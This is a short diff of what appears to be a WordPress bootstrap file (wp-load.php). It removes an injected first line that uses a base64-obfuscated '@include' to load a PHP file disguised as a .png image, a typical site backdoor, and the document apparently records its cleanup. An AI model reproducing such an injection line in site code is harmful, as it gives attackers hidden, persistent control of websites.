@@ -1,4 +1,4 @@
-<?php @include base64_decode("L3Zhci93d3cvc2ltb25uZWVsbGVfZGUvd29yZHByZXNzL3dwLWluY2x1ZGVzL2ltYWdlcy9tZWRpYS9hY2JkYWNmZGRjYy5wbmc=");?><?php
+<?php
 /**
  * Bootstrap file for setting the ABSPATH constant
  * and loading the wp-config.php file. The wp-config.php
